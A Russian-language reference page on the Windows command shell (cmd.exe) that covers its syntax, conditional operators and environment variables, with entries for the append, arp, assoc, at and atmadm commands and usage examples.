%WINDIR%\system32\rundll32.exe shell32.dll,Control_RunDLL hotplug.dll – отобразить окно Безопасное извлечение устройства 
AC3FILTER.CPL – открыть свойства фильтра AC3 (если установлен) 
FIREFOX – запустить Mozilla FireFox (если установлен) 
JAVAWS – открыть Java Control Panel (если установлен) 
LOGOFF – выход из системы

NETPROJ – запуск подключения к сетевому проектору (для Vista) 
SF /SCANNOW – сканировать все системные файлы и восстановить поврежденные файлы 
SFC /VERIFYONLY – сканировать только системные файлы 
SFC /SCANFILE = [имя и путь к файлу] – сканировать указанный файл и восстановить его, если он поврежден 
SFC /VERIFYFILE = [имя и путь к файлу] – сканировать только указанный файл 
SFC /SCANONCE – сканировать системные файлы при следующем перезапуске

SFC /REVERT – сбросить начальную конфигурацию (для получения дополнительной информации введите SFC /? в командной строке CMD) 
SHUTDOWN – выключить Windows 
SHUTDOWN -A – остановить выключение Windows 
VSP1CLN – удалить резервную копию файлов, созданных при установке Vista SP 1





Техническая республика - Ресурс для IT-Профессионалов
Утилиты командной строки - CMD.EXE
УДАЛЕННОЕ АДМИНИСТРИРОВАНИЕ СЕРВЕРОВ НА ХОСТИНГЕ HETZNER ONLINE AG - ГЕРМАНИЯ
ROWBOT - БОТ ДЛЯ ИГРЫ В РУЛЕТКУ В ИНТЕРНЕТ-КАЗИНО

Смотрите ещё:
УТИЛИТЫ КОМАНДНОЙ СТРОКИ - CMD.EXE
Команды DOS 
Язык интерпретатора Cmd.exe. Командные файлы
Команды cmd

Общие сведения о командной оболочке

Командная оболочка — это отдельный программный продукт, который обеспечивает прямую связь между пользователем и операционной системой. Текстовый пользовательский интерфейс командной строки предоставляет среду, в которой выполняются приложения и служебные программы с текстовым интерфейсом. В командной оболочке программы выполняются и результат выполнения отображается на экране в виде, сходном с интерпретатором Command.com MS-DOS. Командная оболочка Windows XP использует интерпретатор команд Cmd.exe, который загружает приложения и направляет поток данных между приложениями, для перевода введенной команды в понятный системе вид.

Имеется возможность использовать командную оболочку для создания и редактирования пакетных файлов (также называемых сценариями), что позволит автоматизировать выполнение обычных задач. Например, можно использовать сценарии для автоматизации управления учетными записями пользователей и ежедневной архивацией в нерабочие часы. Также можно использовать сервер сценариев Windows, CScript.exe, для выполнения в командной оболочке сложных сценариев. Выполнение операций с помощью пакетных файлов является более эффективным, чем с помощью интерфейса пользователя. Пакетные файлы принимают все команды, доступные из командной строки. Дополнительные сведения о пакетных файлах и создании сценариев см. в разделе Использование пакетных файлов.

Имеется возможность настроить окно командной строки для облегчения просмотра и для увеличения контроля за выполнением программ. Дополнительные сведения о настройке окна командной строки см. в разделе Настройка командной строки.

Использование синтаксиса команд

Синтаксическая структура выводится в том порядке, в котором следует вводить команду и следующие за ней параметры, если они есть. Следующий пример команды xcopy иллюстрирует разнообразие синтаксических форматов текста.

xcopy источник [результат] [/w] [/p] [/c] [/v] [/q] [/f] [/l] [/g] [/d[:мм-дд-гггг]] [/u] [/i] [/s [/e]] [/t] [/k] [/r] [/h] [{/a|/m}] [/n] [/o] [/x] [/exclude:файл1[+[файл2]][+[файл3]] [{/y|/-y}] [/z]

В следующей таблице показано, как следует интерпретировать различные текстовые форматы.

Использование нескольких команд и символов условной обработки

Можно выполнять несколько команд из одной командной строки или сценария с помощью сиволов условной обработки. При использовании нескольких команд, содержащих символы условной обработки, выполнение команд, стоящих справа от символа условной обработки, будет проводиться в зависимости от результатов выполнения команды, стоящей слева от символа. Например, требуется, чтобы команда выполнялась, только если предыдущая команда не была выполнена успешно. Или требуется, чтобы команда выполнялась, только если предыдущая команда была выполнена успешно.

Для передачи нескольких команд можно использовать специальные символы, перечисленные в следующей таблице.
Символ    Синтаксис                    Определение
                                       Используется для разделения
                                       нескольких команд в одной командной
& [...]   команда1 & команда2          строке. В Cmd.exe выполняется
                                       первая команда, затем вторая
                                       команда.
                                       Запускает команду, стоящую за
                                       символом &&, только если команда,
                                       стоящая перед этим символом была
&& [...]  команда1 && команда2         выполнена успешно. В Cmd.exe
                                       выполняется первая команда. Вторая
                                       команда выполняется, только если
                                       первая была выполнена успешно.
                                       Запускает команду, стоящую за
                                       символом ||, только если команда,
                                       стоящая перед символом || не была
|| [...]  команда1 || команда2         выполнена. В Cmd.exe выполняется
                                       первая команда. Вторая команда
                                       выполняется, только если первая не
                                       была выполнена (полученный код
                                       ошибки превышает ноль).
( ) [...] (команда1 & команда2)        Используется для группировки или
                                       вложения команд.
; или ,   команда1 параметр1;параметр2 Используется для разделения
                                       параметров команды.

Примечания
- Амперсанд (&), вертикальная черта (|) и скобки ( ) являются специальными символами, которым должен предшествовать управляющий символ (^) или кавычки, если эти символы передаются в качестве аргументов.- Если команда завершает операцию успешно, возвращается нулевой (0) код ошибки или не возвращается никакого кода. Дополнительные сведения о кодах завершения см. в разделе Пакеты Microsoft Windows Resource Kits.

Вложенные командные оболочки

Имеется возможность вкладывать командные оболочки в Cmd.exe, открывая новый экземпляр Cmd.exe из командной строки. По умолчанию каждый экземпляр Cmd.exe наследует среду своего родительского приложения Cmd.exe. Вложение экземпляров Cmd.exe позволяет вносить в локальную среду изменения, которые не повлияют на родительское приложение Cmd.exe. Это позволяет сохранять исходную среду Cmd.exe и возвращаться к ней после удаления вложенной командной оболочки. Изменения вложенной командной оболочки не сохраняются.

Чтобы создать вложенную командную оболочку, в командной строке введите:

cmd

Появится сообщение следующего вида:
Microsoft (R) Windows XP (TM)
(C) Copyright 1985-2001 Microsoft Corp.

Чтобы закрыть все вложенные командные оболочки, введите команду exit.

Можно еще уже локализовать изменения в экземпляре Cmd.exe (или в сценарии) с помощью команд setlocal и endlocal. Команда setlocal создает локальную область, а endlocal ее удаляет. Любые изменения, сделанные внутри области, созданной командами setlocal и endlocal, не учитываются; таким образом исходная среда остается без изменений. С помощью этих команд можно создать до 32 вложенных областей. Дополнительные сведения о командах setlocal и endlocal см. в разделах Setlocal и Endlocal.

Использование переменных среды в Cmd.exe

Среда командной оболочки Cmd.exe определяется переменными, задающими поведение командной оболочки и операционной системы. Имеется возможность определить поведение среды командной оболочки или среды всей операционной системы с помощью двух типов переменных среды: системных и локальных. Системные переменные среды определяют поведение глобальной среды операционной системы. Локальные переменные среды определяют поведение среды в данном экземпляре Cmd.exe.

Системные переменные среды заданы заранее в операционной системе и доступны для всех процессов Windows XP. Только пользователи с привилегиями администратора могут изменять эти переменные. Эти переменные наиболее часто используются в сценариях входа в систему.

Локальные переменные среды доступны, только когда пользователь, для которого они были созданы, вошел в систему. Локальные переменные из куста HKEY_CURRENT_USER подходят только для текущего пользователя, но определяют поведение глобальной среды операционной системы.

В следующем списке представлены различные типы переменных в порядке убывания приоритета.

1. Встроенные системные переменные

2. Системные переменные куста HKEY_LOCAL_MACHINE

3. Локальные переменные куста HKEY_CURRENT_USER

4. Все переменные среды и пути указаны в файле Autoexec.bat.

5. Все переменные среды и пути указаны в сценарии входа в систему (если
       он имеется).

6. Переменные, используемые интерактивно в сценарии или пакетном файле

В командной оболочке каждый экземпляр Cmd.exe наследует среду своего родительского приложения. Поэтому можно изменять переменные в новой среде Cmd.exe, что не повлияет на среду родительского приложения.

В следующей таблице приведен список системных и локальных переменных среды для Windows XP.

          Переменная              Тип                    Описание
%ALLUSERSPROFILE%        Локальная        Возвращает размещение профиля
                                          «All Users».
                                          Возвращает используемое по
%APPDATA%                Локальная        умолчанию размещение данных
                                          приложений.
%CD%                     Локальная        Возвращает путь к текущей папке.
                                          Возвращает строку команд, с
%CMDCMDLINE%             Локальная        помощью которой был запущен
                                          данный экземпляр Cmd.exe.
%CMDEXTVERSION%          Системная        Возвращает номер версии текущих
                                          расширений обработчика команд.
%COMPUTERNAME%           Системная        Возвращает имя компьютера.
%COMSPEC%                Системная        Возвращает путь к исполняемой
                                          командной оболочке.
                                          Возвращает текущие данные.
                                          Использует тот же формат, что и
%DATE%                   Системная        команда date /t. Создается
                                          командой Cmd.exe. Дополнительные
                                          сведения о команде date см. в
                                          разделе [8]Date.
                                          Возвращает код ошибки последней
%ERRORLEVEL%             Системная        использовавшейся команды.
                                          Значение, не равное нуля, обычно
                                          указывает на наличие ошибки.
                                          Возвращает имя диска локальной
                                          рабочей станции, связанного с
                                          основным каталогом пользователя.
                                          Задается на основании
%HOMEDRIVE%              Системная        расположения основного каталога.
                                          Основной каталог пользователя
                                          указывается в оснастке
                                          «Локальные пользователи и
                                          группы».
                                          Возвращает полный путь к
                                          основному каталогу пользователя.
                                          Задается на основании
%HOMEPATH%               Системная        расположения основного каталога.
                                          Основной каталог пользователя
                                          указывается в оснастке
                                          «Локальные пользователи и
                                          группы».
                                          Возвращает сетевой путь к общему
                                          основному каталогу пользователя.
                                          Задается на основании
%HOMESHARE%              Системная        расположения основного каталога.
                                          Основной каталог пользователя
                                          указывается в оснастке
                                          «Локальные пользователи и
                                          группы».
                                          Возвращает имя контроллера
%LOGONSEVER%             Локальная        домена, который проверял
                                          подлинность текущей сессии.
%NUMBER_OF_PROCESSORS%   Системная        Задает количество процессоров,
                                          установленных на компьютере.
                                          Возвращает имя операционной
                                          системы. При использовании
%OS%                     Системная        Windows 2000 имя операционной
                                          системы отображается как
                                          Windows_NT.
%PATH%                   Системная        Указывает путь поиска для
                                          исполняемых файлов.
                                          Возвращает список расширений
%PATHEXT%                Системная        файлов, которые рассматриваются
                                          операционной системой как
                                          исполняемые.
                                          Возвращает архитектуру
%PROCESSOR_ARCHITECTURE% Системная        процессора. Значения: [9]x86,
                                          IA64.
%PROCESSOR_IDENTFIER%    Системная        Возвращает описание процессора.
                                          Возвращает номер модели
%PROCESSOR_LEVEL%        Системная        процессора, установленного на
                                          компьютере.
%PROCESSOR_REVISION%     Системная        Возвращает номер модификации
                                          процессора.
                                          Возвращает параметры командной
%PROMPT%                 Локальная        строки для текущего
                                          интерпретатора. Создается
                                          командой Cmd.exe.
                                          Возвращает произвольное
%RANDOM%                 Системная        десятичное число от 0 до 32767.
                                          Создается командой Cmd.exe.
                                          Возвращает имя диска,
%SYSTEMDRIVE%            Системная        содержащего корневой каталог
                                          Windows XP (т. е. системный
                                          каталог).
%SYSTEMROOT%             Системная        Возвращает размещение системного
                                          каталога Windows XP.
                                          Возвращает временные папки, по
                                          умолчанию используемые
                         Системная и      приложениями, которые доступны
%TEMP% и %TMP%           пользовательская пользователям, выполнившим вход
                                          в систему. Некоторые приложения
                                          требуют переменную TEMP, другие
                                          — переменную TMP.
                                          Возвращает текущее время.
                                          Использует тот же формат, что и
%TIME%                   Системная        команда time /t. Создается
                                          командой Cmd.exe. Дополнительные
                                          сведения о команде time см. в
                                          разделе [10]Time.
                                          Возвращает имя домена,
%USERDOMAIN%             Локальная        содержащего список учетных
                                          записей пользователей.
%USERNAME%               Локальная        Возвращает имя пользователя,
                                          выполнившего вход в систему.
%USERPROFILE%            Локальная        Возвращает размещение профиля
                                          для текущего пользователя.
%WINDIR%                 Системная        Возвращает размещение каталога
                                          операционной системы.

Установка переменных среды

Используйте команду set для создания, удаления или отображения переменных среды. Команда set изменяет переменные только в среде текущей оболочки.

Чтобы отобразить переменную, в командной строке введите:

set имя_переменной

Чтобы добавить переменную, в командной строке введите:

set variablename=значение

Чтобы удалить переменную, в командной строке введите:

set имя_переменной=

Имеется возможность использовать большинство символов в качестве значений переменных, в том числе пробел. При использовании специальных символов, таких как <, >, &, или ^, перед ними следует помещать управляющий символ (^) или кавычки. При использовании кавычек они включаются в значение переменной, так как все символы, следующие после знака равенства принимаются за значение переменной. Учтите следующие примеры.
- Чтобы создать значение переменной new&name ,введите:

set varname=new^&name
- Чтобы создать значение переменной "new&name" ,введите:

set varname="new&name"
- При вводе в командной строке set varname=new&name появляется следующее сообщение об ошибке:

"'name' is not recognized as an internal or external command, operable program or batch file."

В именах переменных регистр символов не учитывается. Однако, команда set отображает значение переменной так, как оно было введено. Можно комбинировать символы нижнего и верхнего регистра в именах переменных, чтобы облегчить восприятие кода (например, ИмяПользователя).

Примечания
- Максимальный размер отдельной переменной среды составляет 8192 байта.- Максимальный общий размер всех переменных среды, включая имена переменных и знак равенства, составляет 65 536 Кбайт.
Подстановка значений в переменные среды

Чтобы иметь возможность подставлять значения в переменную среды из командной строки или из сценариев, следует заключить имя соответствующей переменной в символы процентов (%имя_переменной%). Символы процентов указывают на то, что Cmd.exe должен обратиться к значениям переменных, а не делать посимвольное сравнение. После определения значения для имени переменной, заключите имя переменной в символы процентов. Cmd.exe проводит поиск всех вхождений имени переменной и заменяет его на определенное значение переменной. Например, требуется создать сценарий, содержащий различные значения (например, имена пользователей), и требуется определить соответствующее значение переменной среды USERNAME для каждого пользователя. Для этого следует написать сценарий с использованием переменной USERNAME, заключенной в кавычки. При выполнении сценария Cmd.exe заменит вхождения %USERNAME% соответствующими значениями, что избавит от необходимости делать это вручную для каждого пользователя. Подстановка значений не является рекурсивной. Cmd.exe проверяет переменные один раз. Дополнительные сведения о подстановке значений в переменные см. в разделах For и Call.
========================================================================================
Append

Разрешение программе открывать файлы данных в указанных папках, как будто они находятся в текущей папке. Вызванная без параметров, команда append выводит список присоединенных каталогов.
Синтаксис

append [;] [[диск:]путь[;...]] [/x:{on|off}][/path:{on|off}] [/e]
Параметры

;
    Очищает список папок, заданных в предыдущих вызовах команды append.
[диск:]путь
    Задает диск и папку, которую требуется присоединить к текущей папке. Если диск не указан, по умолчанию используется текущий диск. Имеется возможность задать несколько комбинаций [диск:]путь, разделенных точкой с запятой.
/x:{on | off}
    Определяет, будет ли подсистема MS-DOS искать присоединенные папки при выполнении программ. /x:on — поиск присоединенных папок выполняется. /x:off — поиск присоединенных папок не выполняется. 
/path:{on|off}
    Указывает программе на необходимость поиска файлов в присоединенных папках, если имена файлов указаны полностью. По умолчанию используется значение /path:on.
/e
    Запись списка присоединенных папок в переменную среды APPEND. Этот параметр командной строки можно использовать только при первом вызове команды append после запуска системы.
/?
    Отображение справки в командной строке.

Заметки
- Сохранение списка присоединенных папок

Параметр командной строки /e команды append позволяет присвоить список присоединенных папок переменной среды с именем APPEND. Для этого сначала используйте команду append только с параметром командной строки /e. Затем повторно воспользуйтесь командой append, указав папки, которые требуется присоединить. Параметры /e и [диск:]путь не могут использоваться в одной командной строке.
- Задание нескольких присоединенных папок

Чтобы присоединить несколько папок, вводите их, разделяя точками с запятой. При повторном вызове команды append с параметрами [диск:]путь существующий список присоединенных папок в команде append будет заменен новым.
- Использование параметра dir

При использовании команды dir для вывода списка фалов и подкаталогов каталога имена файлов из присоединенных папок не отображаются.
- Разрешение конфликтов имен файлов

Если в имена файлов в текущей и присоединенной папке совпадают, для работы программ открываются файлы текущей папки.
- Команда append и создание новых файлов

Если открыт файл в присоединенной папке, то работа с ним ведется так же, как и с файлами текущей папки. Если выполняется сохранение файла путем создания файла с таким же именем, новый файл сохраняется в текущей папке, а не в присоединенной. Команда append используется при работе с файлами данных, которые не изменяются или изменяются без создания новых копий. Например, при работе с базами данных новые копии файлов, как правило, не создаются. Текстовые редакторы и процессоры обычно сохраняют файлы путем создания новых копий. Чтобы избежать некорректной работы, не используйте команду append с такими программами.
- Использование параметра /x:on с командой path

Если задан параметр /x:on, программы, находящиеся в присоединенных папках, могут быть запущены просто вводом имени программы в командной строке. Обычно команда path позволяет указать папки, содержащие программы, однако для указания присоединенных папок, содержащих программы, не требуется использовать команду path. Подсистема MS-DOS найдет эту программу с использованием списка присоединенных каталогов. Это вызвано тем, что MS-DOS вначале ищет исполняемый файл программы в текущем каталоге, а затем в каталогах, задаваемых командой .
- Сокращение параметра /x:on до /x

Имеется возможность сократить параметр /x:on до /x. Для этого введите параметр /x:on при первом вызове команды append после запуска системы. После этого можно переключаться между /x:on и /x:off.
- Использование параметра /e с командой set

Воспользовавшись параметром /e с командой set, можно вывести список присоединенных папок. Для получения дополнительных сведений о переменных среды и команде set щелкните ссылку «».
Примеры

Чтобы получить возможность открывать в программах файлы данных из папок B:\Letters и A:\Reports как из текущей папки, введите:

append b:\letters;a:\reports

Чтобы присоединить те же самые папки и сохранить копию списка присоединенных файлов в среде Windows XP (эту операцию нужно выполнять при первом вызове команды append после запуска системы), введите:

append /e

append b:\letters;a:\reports
========================================================================================
Arp

Служит для вывода и изменения записей кэша протокола ARP, который содержит одну или несколько таблиц, использующихся для хранения IP-адресов и соответствующих им физических адресов Ethernet или Token Ring. Для каждого сетевого адаптера Ethernet или Token Ring, установленного в компьютере, используется отдельная таблица. Запущенная без параметров, команда arp выводит справку.
Синтаксис

arp [-a [инет_адрес] [-N иф_адрес]] [-g [инет_адрес] [-N иф_адрес]] [-d инет_адрес [иф_адрес]] [- инет_адрес е_адрес [иф_адрес]]
Параметры

-a [инет_адрес] [-N иф_адрес]
    Вывод таблиц текущего протокола ARP для всех интерфейсов. Чтобы вывести записи ARP для определенного IP-адреса, воспользуйтесь командой arp -a с параметром инет_адрес, где инет_адрес — это IP-адрес. Чтобы вывести таблицы кэша ARP для определенного интерфейса, укажите параметр -N иф_адрес, где иф_адрес — это IP-адрес, назначенный интерфейсу. Параметр -N вводится с учетом регистра.
-g [инет_адрес] [-N иф_адрес]
    Совпадает с -a.
-d инет_адрес [иф_адрес]
    Удаление записи с определенным IP-адресом, где инет_адрес — это IP-адрес. Чтобы запись таблицы для определенного интерфейса, укажите параметр иф_адрес, где иф_адрес — это IP-адрес, назначенный интерфейсу. Чтобы удалить все записи, введите звездочку (*) вместо параметра инет_адрес.
-s инет_адрес е_адрес [иф_адрес]
    Добавление статической записи, которая сопоставляет IP-адрес инет_адрес с физическим адресом е_адрес, в кэш ARP. Чтобы добавить статическую запись кэша ARP в таблицу для определенного интерфейса, укажите параметр иф_адрес, где иф_адрес — это IP-адрес, назначенный интерфейсу.
/?
    Отображение справки в командной строке.

Заметки
- IP-адреса для параметров инет_адрес и иф_адрес записываются в точечно-десятичной нотации. - Физический адрес для параметра е_адрес состоит из шести байт, записанных в шестнадцатеричном формате и разделенных дефисами (например 00-AA-00-4F-2A-9C). - Записи, добавленные с параметром -s, являются статическими и не удаляются из кэша ARP после истечения периода времени. Записи удаляются, если остановлен и запущен протокол TCP/IP. Чтобы создать постоянные статические записи кэша ARP, введите соответствующие команды arp и воспользуйтесь планировщиком заданий для выполнения этого файла при запуске. - Эта команда доступна, только если в свойствах сетевого адаптера в объекте Сетевые подключения в качестве компонента установлен протокол Интернета (TCP/IP).
Примеры

Чтобы вывести таблицы кэша ARP для всех интерфейсов, введите:

arp -a

Чтобы вывести таблицу кэша ARP для интерфейса, которому назначен IP-адрес 10.0.0.99, введите:

arp -a -N 10.0.0.99

Чтобы добавить статическую запись кэша ARP, которая сопоставляет IP-адрес 10.0.0.80 с физическим адресом 00-AA-00-4F-2A-9C, введите:

arp - 10.0.0.80 00-AA-00-4F-2A-9C
========================================================================================
Assoc

Вывод или изменение связи между расширениями имени и типами файлов. Запущенная без параметров команда assoc выводит список текущих связей между расширениями имени и типами файлов.
Синтаксис

assoc [.рсш[=[тип_файла]]]
Параметры

.рсш
    Задание расширения имени файла.
тип_файла
    Задание типа файла, с которым сопоставляется указанное расширение имени файла.
/?
    Отображение справки в командной строке.

Заметки
- Чтобы удалить связь между расширением имени и типом файла, введите пробел после знака равенства.- Чтобы просмотреть текущие типы файлов, выполните команду ftype без параметров.- Чтобы направить вывод команды assoc в текстовый файл, воспользуйтесь оператором перенаправления >.
Примеры

Чтобы вывести текущий тип файла, соответствующий расширению имени файла .txt, введите:

assoc .txt

Чтобы удалить тип файла, соответствующий расширению имени файла .txt, введите:

assoc .txt=

Чтобы просмотреть текущие сопоставления типов файлов, введите:

assoc | more

Чтобы отправить результаты выполнения команды assoc в файл Assoc.cfg, введите:

assoc>assoc.cfg
========================================================================================
At

Запуск программ и команд в заданное время. Команду at можно использовать только при запущенной службе расписаний. Вызванная без параметров команда at выводит список всех команд и программ, которые будут запущены с ее помощью.
Синтаксис

at [\\имя_компьютера] [{[код] [/delete]|/delete [/yes]}]

at [[\\имя_компьютера] часы:минуты [/interactive] [{/every:дата[,...]|/next:дата[,...]}] команда]
Параметры

\\имя_компьютера
    Задание удаленного компьютера, на котором могут быть запущены команды и программы. Если этот параметр не задан, предполагается, что они будут запущены на том компьютере, где выполняется команда at.
код
    Указание идентификационного номера, присваиваемого команде или программе, которая будет запущена.
/delete
    Отмена выполнения команды. Если идентификатор Код не задан, все запланированные команды на компьютере будут отменены.
/yes
    Задание утвердительного ответа на все запросы системы при отмене запланированных событий.
часы:минуты
    Задание времени запуска команды. Время задается в 24-х часовом формате часы:минуты (от 00:00 [полночь] до 23:59).
/interactive
    Обмен данными с помощью команды с теми пользователями, которые работают в системе в момент выполнения запланированной команды.
/every:
    Выполнение команды в указанный день или дни в течение недели или месяца (например каждый четверг или каждый третий день месяца).
дата
    Задание даты выполнения команды. Имеется возможность указать один или несколько дней недели (т. е. ввести M,T,W,Th,F,S,Su) либо один или несколько дней месяца (т. е. ввести числа в диапазоне от 1 до 31). Несколько дат разделяются запятыми. Если параметр дата не задан, в команде at используется текущий день месяца.
/next:
    Выполнение команды при наступлении следующей заданной даты (например в следующий четверг). 
команда
    Задание команды Windows, программы (т. е. файл .exe или .com) или пакетного файла (т. е. файл .bat или .cmd), которые требуется выполнить. Если для задания команды необходимо указывать ее местоположение, имя файла задается полностью, с указанием пути и диска. Если команда запускается на удаленном компьютере, укажите имя сервера и сетевое имя в стандартном формате записи пути (UNC), а не имя диска этого компьютера.
/?
    Отображение справки в командной строке.

Заметки
-

Команда Schtasks является более мощным, расширенным средством планирования заданий с помощью командной строки и включает в себя все функциональные возможности команды at. Для планирования заданий с командной строки используйте команду schtasks вместо at. Для получения дополнительных сведений о команде schtasks щелкните ссылку "".
- Использование at

Для вызова команды at пользователь должен быть членом локальной группы администраторов.
- Загрузка программы Cmd.exe

Команда at не вызывает автоматически командный процессор Cmd.exe перед запуском команды. Если запускается не исполняемый (.exe) файл, перед командой должен быть явно загружен командный процессор Cmd.exe, например:

cmd /c dir > c:\test.out
- Просмотр запланированных команд

Если команда at используется без параметров, запланированные задания выводятся в таблице следующего вида:
Состояние  Код  День        Время       Командная строка
OK         1    Каждый F    4:30 PM     net send group leads status due
OK         2    Каждый M    12:00 AM    chkstor > check.file
OK         3    Каждый F    11:59 PM    backup2.bat

Если в командной строке для команды at указан идентификационный номер (код), выводятся сведения об одной записи, имеющие следующий вид:

Код задачи: 1
Состояние: OK
Дата: Каждый F
Время дня: 4:30 PM
Команда: net send group leads status due

После того как запуск команды запланирован с помощью at, особенно если запускаемая команда имеет дополнительные параметры, проверьте правильность ее ввода, вызвав at без параметров. Если сведения в столбце «Командная строка» содержат ошибки, удалите запись о данной команде в списке запланированных команд и повторно введите данные. Если по-прежнему имеют место ошибки, введите команду с меньшим числом параметров.
- Просмотр результатов

Команды, запуск которых задан с помощью at, выполняются как фоновые процессы. Сведения не отображаются на экране компьютера. Для перенаправления вывода в файл используется символ перенаправления (>). Если вывод перенаправляется в файл, необходимо использовать управляющий символ (^) перед символом перенаправления независимо от того, используется ли at в командной строке или в пакетном файле. Например, чтобы перенаправить вывод в файл Output.txt, введите:

at 14:45 c:\test.bat ^>c:\output.txt

Текущим каталогом для выполнения запланированных команд является системный_корневой_каталог.
- Изменение системного времени

Если системное время изменено после планирования вызова команд с помощью at, синхронизируйте планировщик команды at с измененным системным временем, вызвав at без параметров.
- Сохранение запланированных команд

Запланированные команды сохраняются в реестре. Таким образом, запланированные задания не будут потеряны при перезапуске службы расписаний.
- Подключение к сетевым дискам

Не указывайте перенаправленные диски для запланированных заданий, требующих доступ к сети. Служба расписаний может не получить доступа к таким дискам или диски могут оказаться неподключенными, если другой пользователь окажется подключенным к системе в момент выполнения запланированного задания. Вместо этого, используйте пути UNC при работе с запланированными заданиями. Например:

at 13:00 my_backup \\server\share

Запрещается использовать следующий синтаксис, где x: — подключение, устанавливаемое пользователем:

at 13:00 my_backup x:

Если с помощью at запланирована команда, использующая буквенное обозначение диска для подключения к общему каталогу, то после выполнения команды должна быть запланирована команда at, отключающая данный диск. В противном случае, имя, присвоенное данному диску, будет недоступно в командной строке.
Примеры

Для вывода списка команд, которые будут выполнены на сервере Marketing, можно использовать следующую команду:
at \\marketing

Для получения дополнительных сведений о команде с идентификатором 3 на сервере Corp требуется ввести следующую команду:
at \\corp 3

Для запуска команды net share на сервере Corp в 8:00 и перенаправления вывода на сервер Maintenance в общий каталог Reports в файл Corp.txt требуется ввести следующую команду:
at \\corp 08:00 cmd /c "net share reports=d:\marketing\reports >> \\maintenance\reports\corp.txt"

Чтобы записывать на магнитную ленту резервную копию жесткого диска сервера Marketing в полночь через каждые пять дней, создайте пакетный файл Archive.cmd, содержащий команды резервирования, а затем запланируйте запуск пакетного файла, введя:
at \\marketing 00:00 /every:5,10,15,20,25,30 archive

Чтобы отменить вызов всех команд, запланированных на данном сервере, необходимо очистить расписание команды at следующим образом:
at /delete

Чтобы запустить команду, которая не является исполняемым файлом, введите перед ней cmd /c для загрузки программы Cmd.exe следующим образом:
cmd /c dir > c:\test.out 
========================================================================================
Atmadm

Контроль подключений и адресов, зарегистрированных диспетчером вызовов ATM в сетях с асинхронным режимом передачи (ATM). Команда atmadm может быть использована для вывода статистики входящих и исходящих вызовов ATM-адаптеров. Вызванная без параметров команда atmadm отображает статистику для контроля состояния активных ATM-подключений.
Синтаксис

atmadm [/c][/a] [/s]
Параметры

/c
    Вывод сведений о вызовах для всех текущих подключений к сетевому ATM-адаптеру, установленному на компьютере.
/a
    Вывод зарегистрированного ATM-адреса точек доступа к сетевым службам (Network Service Access Point, NSAP) для каждого адаптера, установленного на компьютере.
/s
    Вывод статистики для контроля состояния активных ATM-подключений.
/?
    Отображение справки в командной строке.

Примеры
Вывод сведений о вызовах

Чтобы вывести сведения о вызовах для всех текущих подключений к сетевому ATM-адаптеру, установленному на компьютере, введите:

atmadm /c

Сведения, полученные в результате выполнения команды atmadm /c, будут иметь следующий вид:


Статистика диспетчера звонков ATM
ATM-подключения для интерфейса : [009] Адаптер Olicom ATM PCI 155
 Подключение VPI/VCI Удаленный адрес/
 Параметры носителя (измеряются в байт/с)
 In PMP SVC 0/193 47000580FFE1000000F21A2E180020481A2E180B
 Tx:UBR,Peak 0,Avg 0,MaxSdu 1516
 Rx:UBR,Peak 16953936,Avg 16953936,MaxSdu 1516
 Out P-P SVC 0/192 47000580FFE1000000F21A2E180020481A2E180B
 Tx:UBR,Peak 16953936,Avg 16953936,MaxSdu 1516
 Rx:UBR,Peak 16953936,Avg 16953936,MaxSdu 1516
 In PMP SVC 0/191 47000580FFE1000000F21A2E180020481A2E180B
 Tx:UBR,Peak 0,Avg 0,MaxSdu 1516
 Rx:UBR,Peak 16953936,Avg 16953936,MaxSdu 1516
 Out P-P SVC 0/190 47000580FFE1000000F21A2E180020481A2E180B
 Tx:UBR,Peak 16953936,Avg 16953936,MaxSdu 1516
 Rx:UBR,Peak 16953936,Avg 16953936,MaxSdu 1516
 In P-P SVC 0/475 47000580FFE1000000F21A2E180000C110081501
 Tx:UBR,Peak 16953984,Avg 16953984,MaxSdu 9188
 Rx:UBR,Peak 16953936,Avg 16953936,MaxSdu 9188
 Out PMP SVC 0/194 47000580FFE1000000F21A2E180000C110081501 (0)
 Tx:UBR,Peak 16953984,Avg 16953984,MaxSdu 9180
 Rx:UBR,Peak 0,Avg 0,MaxSdu 0
 Out P-P SVC 0/474 4700918100000000613E5BFE010000C110081500
 Tx:UBR,Peak 16953984,Avg 16953984,MaxSdu 9188
 Rx:UBR,Peak 16953984,Avg 16953984,MaxSdu 9188
 In PMP SVC 0/195 47000580FFE1000000F21A2E180000C110081500
 Tx:UBR,Peak 0,Avg 0,MaxSdu 0
 Rx:UBR,Peak 16953936,Avg 16953936,MaxSdu 9180

В следующей таблице содержится описание каждого элемента из приведенного вывода команды atmadm /c.
Тип данных     Изображение на экране     Описание
Сведения о подключении     In/Out     Направление вызова. In — вызов сетевого ATM-адаптера другим устройством. Out — вызов другого устройства сетевым ATM-адаптером.
    PMP     Вызов из одной точки нескольких точек.
    P-P     Прямой вызов.
    SVC     Соединение по переключаемому виртуальному каналу.
    PVC     Соединение по постоянному виртуальному каналу.
Сведения о VPI/VCI     VPI/VCI     Виртуальный путь и виртуальный канал входящего и исходящего вызовов.
Удаленный адрес/Параметры носителя     47000580FFE1000000F21A2E180000C110081500     Адрес NSAP вызывающего (In) или вызываемого (Out) устройства ATM.
    Tx     Параметр Tx включает три следующих элемента. - Указанный или используемый по умолчанию тип скорости передачи (UBR — неуказанная, CBR — постоянная, VBR — переменная или ABR — доступная скорость передачи).- Указанная или используемая по умолчанию скорость линии.- Указанный размер единицы данных службы (SDU).
    Rx     Параметр Rx включает три следующих элемента. - Указанный или используемый по умолчанию тип скорости передачи (UBR — неуказанная, CBR — постоянная, VBR — переменная или ABR — доступная скорость передачи).- Указанная или используемая по умолчанию скорость линии.- Указанный размер единицы данных службы (SDU).
Вывод всех зарегистрированных адресов

Чтобы вывести зарегистрированные ATM-адреса точек доступа к сетевым службам (Network Service Access Point, NSAP) для каждого адаптера, установленного на компьютере, введите:

atmadm /a

Сведения, полученные в результате выполнения команды atmadm /a, будут иметь следующий вид:


Статистика диспетчера звонков ATM
Адреса ATM для интерфейса : [009] Адаптер Olicom ATM PCI 155
47000580FFE1000000F21A2E180000C110081500

Вывод статистики

Чтобы вывести статистику для контроля состояния активных ATM-подключений, введите:

atmadm /s

Сведения, полученные в результате выполнения команды atmadm /s, будут иметь следующий вид:


Статистика диспетчера звонков ATM
Статистика диспетчера вызовов ATM для интерфейса : [009] Адаптер Olicom ATM PCI 155
    Текущие активные звонки = 4
    Общее число успешных входных звонков = 1332
    Общее число успешных выходных звонков = 1297
    Число сбоев входных звонков = 1
    Число сбоев выходных звонков = 1
    Число звонков, прерванных удаленным абонентом = 1302
